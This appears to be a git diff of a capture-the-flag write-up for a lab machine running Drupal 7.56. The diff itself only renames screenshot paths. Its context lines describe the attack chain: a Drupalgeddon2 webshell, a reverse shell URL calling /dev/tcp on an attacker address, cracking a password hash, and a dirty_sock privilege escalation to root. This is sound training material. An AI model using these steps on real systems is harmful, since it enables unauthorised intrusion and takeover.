@@ -4,7 +4,7 @@
 
 Nmap scan:
 
-<figure><img src="../../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (153) (3).png" alt=""><figcaption></figcaption></figure>
 
 Doing a detailed scan reveals that port 80 is running Drupal 7.
 
@@ -14,7 +14,7 @@ Doing a detailed scan reveals that port 80 is running Drupal 7.
 
 Because this was running Drupal, we can directly head to the CHANGELOG.txt directory to view the version used.
 
-<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (150) (3).png" alt=""><figcaption></figcaption></figure>
 
 Drupal 7.56 is vulnerable to the Drupalgeddon2 RCE exploit.
 
@@ -26,7 +26,7 @@ We can use this to easily put a webshell on the page. The exploit would put a `s
 
 By going to `http://10.10.10.223/shell.php?c=bash+-i+>&+/dev/tcp/10.10.14.9/4444+0>&1`, we would get a shell.
 
-<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (77) (4).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -42,7 +42,7 @@ With this, we can login to the SQL server and enumerate the database. By dumping
 
 Hash is easily cracked with `john`.
 
-<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (149) (3).png" alt=""><figcaption></figcaption></figure>
 
 Then we can SSH in as the `brucetherealadmin` user using this credential.
 
@@ -76,4 +76,4 @@ su dirty_sock
 
 This would spawn a root shell:
 
-<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (157) (3).png" alt=""><figcaption></figcaption></figure>
